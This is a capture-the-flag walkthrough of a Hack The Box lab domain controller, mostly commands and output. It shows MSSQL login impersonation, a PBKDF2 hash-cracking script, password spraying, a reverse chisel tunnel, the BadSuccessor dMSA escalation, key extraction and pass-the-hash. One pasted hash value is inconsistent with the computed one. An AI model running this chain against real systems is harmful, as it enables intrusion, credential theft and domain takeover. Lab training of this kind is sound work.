```bash
nmap -sV -sC -sT --min-rate 10000 -Pn -p- 10.129.11.122
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-25 20:35 +0000
Nmap scan report for 10.129.11.122
Host is up (0.11s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to http://eighteen.htb/
1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   10.129.11.122:1433: 
|     Target_Name: EIGHTEEN
|     NetBIOS_Domain_Name: EIGHTEEN
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: eighteen.htb
|     DNS_Computer_Name: DC01.eighteen.htb
|     DNS_Tree_Name: eighteen.htb
|_    Product_Version: 10.0.26100
| ms-sql-info: 
|   10.129.11.122:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2026-03-26T03:35:53+00:00; +7h00m02s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-03-26T03:32:32
|_Not valid after:  2056-03-26T03:32:32
5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h00m01s, deviation: 0s, median: 7h00m01s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.21 seconds
```

We use **`Impacket-mssqlclient:`**
```bash
impacket-mssqlclient kevin:'iNa2we6haRj2gaw!'@10.129.11.122
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (kevin  guest@master)> SELECT IS_SRVROLEMEMBER('sysadmin');
SQL (kevin  guest@master)> SELECT name FROM sys.databases;
name                
-----------------   
master              
tempdb              
model               
msdb                
financial_planner   
SQL (kevin  guest@master)> EXEC sp_linkedservers;
SRV_NAME   SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE   SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
--------   ----------------   -----------   --------------   ------------------   ------------   -------   
DC01       SQLNCLI            SQL Server    DC01             NULL                 NULL           NULL      
SQL (kevin  guest@master)> SELECT name, type_desc, is_disabled FROM sys.server_principals;
name                                  type_desc     is_disabled   
-----------------------------------   -----------   -----------   
sa                                    SQL_LOGIN               0   
public                                SERVER_ROLE             0   
sysadmin                              SERVER_ROLE             0   
securityadmin                         SERVER_ROLE             0   
serveradmin                           SERVER_ROLE             0   
setupadmin                            SERVER_ROLE             0   
processadmin                          SERVER_ROLE             0   
diskadmin                             SERVER_ROLE             0   
dbcreator                             SERVER_ROLE             0   
bulkadmin                             SERVER_ROLE             0   
##MS_ServerStateReader##              SERVER_ROLE             0   
##MS_ServerStateManager##             SERVER_ROLE             0   
##MS_DefinitionReader##               SERVER_ROLE             0   
##MS_DatabaseConnector##              SERVER_ROLE             0   
##MS_DatabaseManager##                SERVER_ROLE             0   
##MS_LoginManager##                   SERVER_ROLE             0   
##MS_SecurityDefinitionReader##       SERVER_ROLE             0   
##MS_PerformanceDefinitionReader##    SERVER_ROLE             0   
##MS_ServerSecurityStateReader##      SERVER_ROLE             0   
##MS_ServerPerformanceStateReader##   SERVER_ROLE             0   
kevin                                 SQL_LOGIN               0   
appdev                                SQL_LOGIN               0   
SQL (kevin  guest@master)> 
```

we see another user **`appdev`**, I tried to connect to `financial_planner` as `kevin` but it was getting blocked so lets try with **`appdev`**:
```bash
SQL (kevin  guest@master)> USE financial_planner;
ERROR(DC01): Line 1: The server principal "kevin" is not able to access the database "financial_planner" under the current security context.
SQL (kevin  guest@msdb)> EXECUTE AS LOGIN = 'appdev';
SQL (appdev  guest@msdb)> SELECT IS_SRVROLEMEMBER('sysadmin');
    
-   
0   
SQL (appdev  guest@msdb)> SELECT SYSTEM_USER;
         
------   
appdev
SQL (appdev  guest@msdb)> USE financial_planner;
ENVCHANGE(DATABASE): Old Value: msdb, New Value: financial_planner
INFO(DC01): Line 1: Changed database context to 'financial_planner'.
SQL (appdev  appdev@financial_planner)> SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;
TABLE_NAME    
-----------   
users         
incomes       
expenses      
allocations   
analytics     
visits        
SQL (appdev  appdev@financial_planner)> SELECT * FROM users;
  id   full_name   username   email                password_hash                                                                                            is_admin   created_at   
----   ---------   --------   ------------------   ------------------------------------------------------------------------------------------------------   --------   ----------   
1002   admin       admin      admin@eighteen.htb   pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133          1   2025-10-29 05:39:03   
SQL (appdev  appdev@financial_planner)>
```

To crack a hash in the `pbkdf2:sha256:600000` format (commonly used by Python's Werkzeug or Django), you should use Hashcat **mode 10900**.
### 1. Reformat the Hash 

Hashcat's PBKDF2-HMAC-SHA256 mode (10900) requires a specific colon-separated format. Your input typically looks like `pbkdf2:sha256:600000$salt$hash`. You must convert it to:  
`sha256:600000:base64_salt:base64_hash`:
- **Algorithm**: `sha256`
- **Iterations**: `600000`
- **Salt**: Must be **Base64 encoded**.
- **Hash**: Must be **Base64 encoded**.
If your source hash uses hexadecimal for the salt or hash, you must convert those specific strings to Base64 before putting them into the Hashcat format.
```bash
┌──(nt0wl㉿kali)-[~/Machines/HackTheBox/Eighteen]
└─$ python3 -c "import base64; print(base64.b64encode(bytes.fromhex('0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133')).decode())"
BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM=
                                                                                                                    
┌──(nt0wl㉿kali)-[~/Machines/HackTheBox/Eighteen]
└─$ vim hash.txt
┌──(nt0wl㉿kali)-[~/Machines/HackTheBox/Eighteen]
└─$ cat hash.txt                  
sha256:600000:AMtzteQIG7yAbZIa:BnOtkKC0r7GdZiM28PzjqO3Qt7GRk3F74ozk1myIcTM=
```


Before moving forward, I wanted to verify exactly where the compromised credentials from SQL could take me inside the domain. Since the SQL service was running on a **domain controller**, I decided to use **NetExec (nxc)** to probe the MSSQL service with the `kevin` credentials:
```bash
netexec mssql 10.129.11.122 -u kevin -p 'iNa2we6haRj2gaw!' --rid-brute --local-auth
MSSQL       10.129.11.122   1433   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb) (EncryptionReq:False)
MSSQL       10.129.11.122   1433   DC01             [+] DC01\kevin:iNa2we6haRj2gaw! 
MSSQL       10.129.11.122   1433   DC01             498: EIGHTEEN\Enterprise Read-only Domain Controllers
MSSQL       10.129.11.122   1433   DC01             500: EIGHTEEN\Administrator
MSSQL       10.129.11.122   1433   DC01             501: EIGHTEEN\Guest
MSSQL       10.129.11.122   1433   DC01             502: EIGHTEEN\krbtgt
MSSQL       10.129.11.122   1433   DC01             512: EIGHTEEN\Domain Admins
MSSQL       10.129.11.122   1433   DC01             513: EIGHTEEN\Domain Users
MSSQL       10.129.11.122   1433   DC01             514: EIGHTEEN\Domain Guests
MSSQL       10.129.11.122   1433   DC01             515: EIGHTEEN\Domain Computers
MSSQL       10.129.11.122   1433   DC01             516: EIGHTEEN\Domain Controllers
MSSQL       10.129.11.122   1433   DC01             517: EIGHTEEN\Cert Publishers
MSSQL       10.129.11.122   1433   DC01             518: EIGHTEEN\Schema Admins
MSSQL       10.129.11.122   1433   DC01             519: EIGHTEEN\Enterprise Admins
MSSQL       10.129.11.122   1433   DC01             520: EIGHTEEN\Group Policy Creator Owners
MSSQL       10.129.11.122   1433   DC01             521: EIGHTEEN\Read-only Domain Controllers
MSSQL       10.129.11.122   1433   DC01             522: EIGHTEEN\Cloneable Domain Controllers
MSSQL       10.129.11.122   1433   DC01             525: EIGHTEEN\Protected Users
MSSQL       10.129.11.122   1433   DC01             526: EIGHTEEN\Key Admins
MSSQL       10.129.11.122   1433   DC01             527: EIGHTEEN\Enterprise Key Admins
MSSQL       10.129.11.122   1433   DC01             528: EIGHTEEN\Forest Trust Accounts
MSSQL       10.129.11.122   1433   DC01             529: EIGHTEEN\External Trust Accounts
MSSQL       10.129.11.122   1433   DC01             553: EIGHTEEN\RAS and IAS Servers
MSSQL       10.129.11.122   1433   DC01             571: EIGHTEEN\Allowed RODC Password Replication Group
MSSQL       10.129.11.122   1433   DC01             572: EIGHTEEN\Denied RODC Password Replication Group
MSSQL       10.129.11.122   1433   DC01             1000: EIGHTEEN\DC01$
MSSQL       10.129.11.122   1433   DC01             1101: EIGHTEEN\DnsAdmins
MSSQL       10.129.11.122   1433   DC01             1102: EIGHTEEN\DnsUpdateProxy
MSSQL       10.129.11.122   1433   DC01             1601: EIGHTEEN\mssqlsvc
MSSQL       10.129.11.122   1433   DC01             1602: EIGHTEEN\SQLServer2005SQLBrowserUser$DC01
MSSQL       10.129.11.122   1433   DC01             1603: EIGHTEEN\HR
MSSQL       10.129.11.122   1433   DC01             1604: EIGHTEEN\IT
MSSQL       10.129.11.122   1433   DC01             1605: EIGHTEEN\Finance
MSSQL       10.129.11.122   1433   DC01             1606: EIGHTEEN\jamie.dunn
MSSQL       10.129.11.122   1433   DC01             1607: EIGHTEEN\jane.smith
MSSQL       10.129.11.122   1433   DC01             1608: EIGHTEEN\alice.jones
MSSQL       10.129.11.122   1433   DC01             1609: EIGHTEEN\adam.scott
MSSQL       10.129.11.122   1433   DC01             1610: EIGHTEEN\bob.brown
MSSQL       10.129.11.122   1433   DC01             1611: EIGHTEEN\carol.white
MSSQL       10.129.11.122   1433   DC01             1612: EIGHTEEN\dave.green
```

So I tried for a while to to crack the hash with **`Hashcat`** but I could not get it to crack. I did a little research a came across a script for cracking **`PBKDF2`**:
```bash
#!/usr/bin/env python3
import hashlib
from multiprocessing import Pool, cpu_count

def check_password(password):
    try:
        computed = hashlib.pbkdf2_hmac(
            'sha256',
            password,
            SALT.encode(),
            ITERATIONS
        )
        if computed.hex() == TARGET_HASH:
            return password.decode(errors="ignore")
    except:
        pass
    return None


# ---- Hash components ----
SALT = "AMtzteQIG7yAbZIa"
ITERATIONS = 600000
TARGET_HASH = "0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133"

# ---- Your wordlist path ----
WORDLIST = "/usr/share/wordlists/rockyou.txt"


def main():
    print(f"[+] Using wordlist: {WORDLIST}")
    print("[+] Starting PBKDF2-SHA256 cracking...")

    with open(WORDLIST, "rb") as f:
        passwords = (line.strip() for line in f)

        with Pool(cpu_count()) as pool:
            for result in pool.imap_unordered(check_password, passwords, chunksize=500):
                if result:
                    print(f"[+] PASSWORD FOUND: {result}")
                    pool.terminate()
                    return

    print("[-] No match found.")


if __name__ == "__main__":
    main()
```


Now we crack the password for **`admin`**:
```bash
┌──(nt0wl㉿kali)-[~/Machines/HackTheBox/Eighteen]
└─$ python3 script.py
[+] Using wordlist: /usr/share/wordlists/rockyou.txt
[+] Starting PBKDF2-SHA256 cracking...
[+] PASSWORD FOUND: iloveyou1
```
Creds:
**`admin:iloveyou1`**

We can now log into the web app:
![[Pasted image 20260326065043.png]]

I decided to password spray against the users i found earlier:

```bash
cat users.txt 
jamie.dunn
jane.smith
alice.jones
adam.scott
bob.brown
carol.white
dave.green
Administrator
```
```bash
┌──(nt0wl㉿kali)-[~/Machines/HackTheBox/Eighteen]
└─$ netexec winrm 10.129.11.122 -u users.txt -p 'iloveyou1' 
WINRM       10.129.11.122   5985   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.11.122   5985   DC01             [-] eighteen.htb\jamie.dunn:iloveyou1
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.11.122   5985   DC01             [-] eighteen.htb\jane.smith:iloveyou1
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.11.122   5985   DC01             [-] eighteen.htb\alice.jones:iloveyou1
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.11.122   5985   DC01             [+] eighteen.htb\adam.scott:iloveyou1 (Pwn3d!)
```

so lets try logging in **`evil-winrm`** as **`adam.scott`**:
```bash
┌──(nt0wl㉿kali)-[~/Machines/HackTheBox/Eighteen]
└─$ evil-winrm -i eighteen.htb -u 'adam.scott' -p 'iloveyou1'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                        
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                   
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\adam.scott\Documents> whoami /all

USER INFORMATION
----------------

User Name           SID
=================== =============================================
eighteen\adam.scott S-1-5-21-1152179935-589108180-1989892463-1609


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
EIGHTEEN\IT                                Group            S-1-5-21-1152179935-589108180-1989892463-1604 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

now lets get the user flag:
```bash
*Evil-WinRM* PS C:\Users\adam.scott\Desktop> dir


    Directory: C:\Users\adam.scott\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         3/25/2026   8:31 PM             34 user.txt


*Evil-WinRM* PS C:\Users\adam.scott\Desktop> type user.txt
3009630c44796293b73295b339b2e614
*Evil-WinRM* PS C:\Users\adam.scott\Desktop> 
```

I was having some issues connect to the machine so I set up chisel and it seemed resolve my issues:
```cmd
Evil-WinRM* PS C:\Users\adam.scott\Desktop> .\chisel.exe client 10.10.15.113:8001 R:socks
chisel.exe : 2026/03/26 17:05:25 client: Connecting to ws://10.10.15.113:8001
    + CategoryInfo          : NotSpecified: (2026/03/26 17:0....10.15.113:8001:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
2026/03/26 17:05:25 client: Connected (Latency 85.3699ms)
```

```bash
┌──(nt0wl㉿kali)-[~/Machines/HackTheBox/Eighteen]
└─$ chisel server -p 8001 --reverse
2026/03/26 17:05:02 server: Reverse tunnelling enabled
2026/03/26 17:05:02 server: Fingerprint Av6iNytz6UvWLIHVFZ2BQjdZayoKhiDcOMVr85cSCVQ=
2026/03/26 17:05:02 server: Listening on http://0.0.0.0:8001
2026/03/26 17:05:24 server: session#1: Client version (1.11.4) differs from server version (1.11.4-0kali1)
2026/03/26 17:05:24 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

now we add Badsuccessor and Sharpsuccessor adn run them:
```cmd
*Evil-WinRM* PS C:\Users\adam.scott\Desktop> .\BadSuccessor.exe escalate `
  -targetOU "OU=Staff,DC=eighteen,DC=htb" `
  -targetUser "CN=Administrator,CN=Users,DC=eighteen,DC=htb" `
  -dmsa BadBoy `
  -user adam.scott `
  -dnshostname BadBoy

 ______           __ _______
|   __ \ .---.-.--|  |     __|.--.--.----.----.-----.-----.-----.-----.----.
|   __ < |  _  |  _  |__     ||  |  |  __|  __|  -__|__ --|__ --|  _  |   _|
|______/ |___._|_____|_______||_____|____|_____|_____|_____|_____|_____|__|

Researcher: @YuG0rd
Author: @kreepsec

[*] Creating dMSA object...
[*] Inheriting target user privileges
    -> msDS-ManagedAccountPrecededByLink = CN=Administrator,CN=Users,DC=eighteen,DC=htb
    -> msDS-DelegatedMSAState = 2
[+] Privileges Obtained.
[*] Setting PrincipalsAllowedToRetrieveManagedPassword
    -> msDS-GroupMSAMembership = adam.scott
[+] Setting userAccountControl attribute
[+] Setting msDS-SupportedEncryptionTypes attribute

[+] Created dMSA 'BadBoy' in 'OU=Staff,DC=eighteen,DC=htb', linked to 'CN=Administrator,CN=Users,DC=eighteen,DC=htb' (DC: auto)

[*] Phase 4: Use Rubeus or Kerbeus BOF to retrieve TGS and Password Hash
    -> Step 1: Find luid of krbtgt ticket
     Rubeus:      .\Rubeus.exe triage
     Kerbeus BOF: krb_triage BOF

    -> Step 2: Get TGT of Windows 2025/24H2 system with a delegated MSA setup and migration finished.
     Rubeus:      .\Rubeus.exe dump /luid:<luid> /service:krbtgt /nowrap
     Kerbeus BOF: krb_dump /luid:<luid>

    -> Step 3: Use ticket to get a TGS ( Requires Rubeus PR: https://github.com/GhostPack/Rubeus/pull/194 )
    Rubeus:      .\Rubeus.exe asktgs /ticket:TICKET_FROM_ABOVE /targetuser:BadBoy$ /service:krbtgt/domain.local /dmsa /dc:<DC hostname> /opsec /nowrap
*Evil-WinRM* PS C:\Users\adam.scott\Desktop> .\SharpSuccessor.exe add `
  /account:adam.scott `
  /impersonate:Administrator `
  /path:"OU=Staff,DC=eighteen,DC=htb" `
  /name:BadBoy2
   _____ _                      _____
  / ____| |                    / ____|
 | (___ | |__   __ _ _ __ _ __| (___  _   _  ___ ___ ___  ___ ___  ___  _ __
  \___ \| '_ \ / _` | '__| '_ \\___ \| | | |/ __/ __/ _ \/ __/ __|/ _ \| '__|
  ____) | | | | (_| | |  | |_) |___) | |_| | (_| (_|  __/\__ \__ \ (_) | |
 |_____/|_| |_|\__,_|_|  | .__/_____/ \__,_|\___\___\___||___/___/\___/|_|
                         | |
                         |_|
@_logangoins

[+] Adding dnshostname BadBoy2.eighteen.htb
[+] Adding samaccountname BadBoy2$
[+] Administrator's DN identified
[+] Attempting to write msDS-ManagedAccountPrecededByLink
[+] Wrote attribute successfully
[+] Attempting to write msDS-DelegatedMSAState attribute
[+] Attempting to set access rights on the dMSA object
[+] Attempting to write msDS-SupportedEncryptionTypes attribute
[+] Attempting to write userAccountControl attribute
[+] Created dMSA object 'CN=BadBoy2' in 'OU=Staff,DC=eighteen,DC=htb'
[+] Successfully weaponized dMSA object
[+] Found target account, attempting to write attributes
[+] CN=BadBoy2,OU=Staff,DC=eighteen,DC=htb written to Administrator object
[+] msDS-SupersededServiceAccountState set to 2
[!] Exception: Access is denied.

*Evil-WinRM* PS C:\Users\adam.scott\Desktop> 
```


Get ST ticket:
```bash
faketime "7+ hours" getST.py -k -no-pass -impersonate BadBoy2$ -self -dmsa eighteen.htb/adam.scott -dc-ip 10.129.11.122
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating BadBoy2$
[*] Requesting S4U2self
[-] [Errno Connection error (10.129.11.122:88)] [Errno 110] Connection timed out
                                                                                                                    
┌──(nt0wl㉿kali)-[~/Machines/HackTheBox/Eighteen]
└─$ faketime "7+ hours" proxychains getST.py -k -no-pass -impersonate BadBoy2$ -self -dmsa eighteen.htb/adam.scott -dc-ip 10.129.11.122
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating BadBoy2$
[*] Requesting S4U2self
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.11.122:88  ...  OK
[*] Current keys:
[*] EncryptionTypes.aes256_cts_hmac_sha1_96:5f555f96626e6ea59e9763cf67f3c7a6e171815b43df8363d9e11fa472bc73be
[*] EncryptionTypes.aes128_cts_hmac_sha1_96:1c4a6be5de1598b114218bdbcedb8239
[*] EncryptionTypes.rc4_hmac:84c7e0954769712e0c32ce0a0d4a0dc2
[*] Previous keys:
[*] EncryptionTypes.rc4_hmac:0b133be956bfaddf9cea56701affddec
[*] Saving ticket in BadBoy2$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache
```

so not lets Evil-WinRM as Administrator:
```bash
 evil-winrm -u administrator -H 0b133be956bfaddf9cea56701affddec -i 10.129.11.122
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                        
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                   
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> dir


    Directory: C:\Users\Administrator\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/29/2025   5:40 AM           1226 clean_OU.ps1
-a----         11/8/2025   7:18 AM            421 warmup_flask.ps1


*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
a47e7de04d49c5e4d94a88fd69e9ff06
*Evil-WinRM* PS C:\Users\Administrator\Desktop> 
```
![[Pasted image 20260326115033.png]]